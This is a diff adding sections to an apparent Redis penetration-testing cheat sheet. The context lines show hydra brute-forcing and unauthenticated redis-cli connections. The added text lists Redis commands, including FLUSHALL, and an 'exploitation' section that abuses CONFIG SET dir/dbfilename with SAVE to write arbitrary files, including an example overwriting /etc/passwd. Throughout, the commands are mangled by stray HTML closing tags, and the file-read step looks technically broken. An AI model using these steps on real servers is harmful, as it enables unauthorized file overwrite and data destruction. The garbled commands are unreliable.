@@ -24,6 +24,108 @@ hydra -l redis -P <path to wordlist> <target IP> redis
 redis-cli -h 192.168.208.69 -p 6379  #Connect with no username or password
 redis-cli -h 192.168.0.0 -p 6379 --user admin --pass password #Connect with username and password
 
+## Redis Commands
+#Connect to Redis server (default: localhost, port 6379)
+redis-cli -h <host> -p <port></port></host>
+#Authenticate if a password is set
+AUTH <password></password>
+#Check if the server is running
+PING
+#Get server information
+INFO SERVER
+INFO CLIENTS
+INFO KEYSPACE
+#List all keys in the current database
+KEYS *
+#Select a specific database (default is 0)
+SELECT <database_number>
+#Get the type of a key
+TYPE <key></key>
+#Get the value of a key
+GET <key></key>
+#Set a key-value pair
+SET <key> <value></value></key>
+#Delete a key
+DEL <key></key>
+#Check if a key exists
+EXISTS <key></key>
+#List all databases
+CONFIG GET databases
+#Get the current database index
+DBSIZE
+#Flush all keys in the current database
+FLUSHDB
+#Flush all keys in all databases
+FLUSHALL
+#Get Redis configuration parameters
+CONFIG GET *
+#Set a configuration parameter (e.g., dir or dbfilename)
+CONFIG SET <parameter> <value></value></parameter>
+#Save the current dataset to disk
+SAVE
+#Get the current working directory of the Redis server
+CONFIG GET dir
+#Get the database filename
+CONFIG GET dbfilename
+
+## File Read/Write Operations for Exploitation Redis Commands
+#Connect to Redis server (default: localhost, port 6379)
+redis-cli -h <host> -p <port></port></host>
+#Set the directory for the Redis database file
+CONFIG SET dir /path/to/directory
+#Set the database filename
+CONFIG SET dbfilename <filename></filename>
+#Write the current dataset to a file (potentially overwriting files)
+SAVE
+#Example: Overwrite /etc/passwd (if permissions allow)
+CONFIG SET dir /etc
+CONFIG SET dbfilename passwd
+SAVE
+#Read a file by loading it as a Redis database file
+CONFIG SET dir /path/to/target/file
+CONFIG SET dbfilename <target_file>
+KEYS *
+GET <key></key>
+#Write a string to a file via a key and save
+SET malicious "<content_to_write>"
+CONFIG SET dir /path/to/destination
+CONFIG SET dbfilename <filename>
+SAVE</filename>
+#Check for loaded modules
+MODULE LIST
+#Execute a Lua script (for advanced exploitation)
+EVAL "<lua_script>" 0
+#List all connected clients
+CLIENT LIST
+#Kill a specific client connection
+CLIENT KILL addr:port
+#Set a key with an expiration time (in seconds)
+SETEX <key> <seconds> <value></value></seconds></key>
+#Get the time to live for a key (in seconds)
+TTL <key></key>
+#Rename a key
+RENAME <key> <newkey></newkey></key>
+#Move a key to another database
+MOVE <key> &#x3C;database_number></key>
+#Scan for keys incrementally (useful for large datasets)
+SCAN 0
+#Get all fields and values of a hash
+HGETALL <key></key>
+#Add a value to a list
+LPUSH <key> <value></value></key>
+#Retrieve values from a list
+LRANGE <key> 0 -1</key>
+#Add a member to a set
+SADD <key> <member></member></key>
+#Retrieve all members of a set
+SMEMBERS <key></key>
+#Publish a message to a channel
+PUBLISH <channel> <message></message></channel>
+#Subscribe to a channel
+SUBSCRIBE <channel></channel>
+#Get the length of a string value
+STRLEN <key></key>
+
 
 ## Use Metasploit Modules ##
 use auxiliary/scanner/redis/redis_server
